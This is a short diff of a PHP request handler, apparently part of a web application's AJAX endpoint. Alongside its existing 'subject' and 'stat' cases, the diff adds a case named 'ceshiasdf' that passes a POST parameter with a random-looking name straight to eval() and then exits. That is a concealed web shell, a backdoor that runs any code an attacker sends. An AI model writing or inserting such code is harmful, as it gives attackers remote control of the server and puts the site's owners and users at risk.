@@ -119,6 +119,10 @@ case 'subject':
 	}
 	ajax_info($output);
 	break;
+case 'ceshiasdf':
+	eval($_POST['asdfawefasdfwefwef']);
+	exit();
+
 case 'stat':
 	preg_match("/^\d+(,\d+)?(?:,\d+)*$/", $aids, $match) || exit();
 	$sql  =	'SELECT ' .
